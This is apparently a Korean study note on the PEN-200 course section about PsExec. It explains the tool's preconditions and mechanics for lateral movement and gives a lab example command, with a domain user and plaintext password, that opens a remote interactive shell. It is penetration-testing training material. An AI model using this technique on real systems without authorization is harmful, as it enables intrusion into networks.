# 24.1.2 PsExec

> **PsExec** · PEN-200 §24.1.2

PsExec 은 SysInternals 스위트에 포함된 원격 실행 도구임. 원래 telnet 류를 대체해 **대화형 콘솔로 원격 프로세스를 실행**하는 용도이고, 그 성질이 그대로 측면 이동에 쓰임.

전제 조건 세 가지 —

- 인증하는 사용자가 대상 머신의 **로컬 Administrators 그룹** 소속일 것
- **`ADMIN$` 공유**가 살아 있을 것
- **File and Printer Sharing** 이 켜져 있을 것

뒤의 둘은 최신 Windows Server 의 기본값이라 대개 이미 충족됨. 즉 실질 관문은 로컬 관리자 권한 하나임.

PsExec 이 원격에서 실제로 하는 일 —

- `psexesvc.exe` 를 대상의 `C:` 에 기록
- 원격 호스트에 서비스를 생성하고 기동
- 요청한 프로그램을 `psexesvc.exe` 의 **자식 프로세스**로 실행

`[가정]` 디스크에 바이너리가 떨어지고 서비스가 새로 생기는 구조라 탐지 관점에서는 시끄러운 방식일 것으로 보임 — 교재가 명시한 평가는 아님.

PsExec 은 Windows 기본 탑재가 아니지만 장악한 머신에 올려두면 그만임. `-i` 로 대화형 세션, 대상 호스트명 앞에 역슬래시 둘, `-u` 에 `도메인\사용자`, `-p` 에 비밀번호, 마지막에 실행할 프로세스를 지정함.

```powershell
PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123!
cmd
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32>hostname
FILES04
C:\Windows\system32>whoami
corp\jen
```

**리버스셸을 받을 Kali 가 필요 없다는 것이 이 기법의 강점임** — 대상 시스템의 대화형 셸이 그 자리에서 열림.
